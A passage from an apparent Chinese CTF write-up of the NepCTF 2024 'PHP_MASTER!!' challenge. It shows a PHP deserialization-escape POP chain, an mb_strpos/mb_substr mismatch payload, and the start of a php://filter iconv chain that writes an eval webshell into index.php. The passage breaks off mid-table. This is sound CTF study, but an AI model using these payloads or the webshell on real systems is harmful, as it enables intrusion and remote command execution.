class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;tp_file&quot;</span>&gt;</span>选择文件:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tp_file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tp_file&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传文件&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>( <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key=== <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\0&quot;</span>,<span class="string">&quot;00&quot;</span>,<span class="variable">$ser</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>先是反序列化逃逸和一些反序列化的特性</p><p>参考链接：<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></p><p>先在本地构造pop链，得到一个正常的序列化字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>( <span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&quot;\0key\0&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key=== <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;readflag&quot;</span>;</span><br><span class="line">            <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$contents</span>));</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;b=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(),<span class="number">1</span>=&gt;<span class="string">&quot;readflag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">// O:1:&quot;C&quot;:2:&#123;s:1:&quot;s&quot;;s:1:&quot;a&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;key&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>接着对这个字符串进行处理，先截取出我们想要的部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;key&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>再接着修改一下<code>key</code>的属性和值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>最后根据字符串的总长度，生成逃逸字符</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\\00key\\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%00&#x27;</span>*<span class="built_in">len</span>(<span class="built_in">str</span>) + <span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:3:&quot;key&quot;;S:5:&quot;\00key\00&quot;;&#125;i:1;s:8:&quot;readflag&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>发送过去，逃逸成功</p><p><img src="/NepCTF_2024/image-20240824163313840.png" alt="image-20240824163313840"></p><p>接着是这部分代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">ctfshow_XGCTF_西瓜杯</a></p><blockquote><p>每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节<br>每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节<br>每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</p></blockquote><p>构造出合适的payload即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nep1=%f0abc%f0abc%f0abc%f0%9f%9fa&amp;nep=Nep</span><br></pre></td></tr></table></figure><p>最后是<code>readflag</code>函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key=== <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以利用伪协议在<code>index.php</code>里面写马</p><p>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$base64_payload</span> = <span class="string">&quot;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4&quot;</span>; <span class="comment">/*&lt;?php <span class="doctag">@eval</span>($_REQUEST[&#x27;cmd&#x27;]);?&gt;*/</span></span><br><span class="line"><span class="variable">$conversions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;6&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;S&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span> =&gt; <span 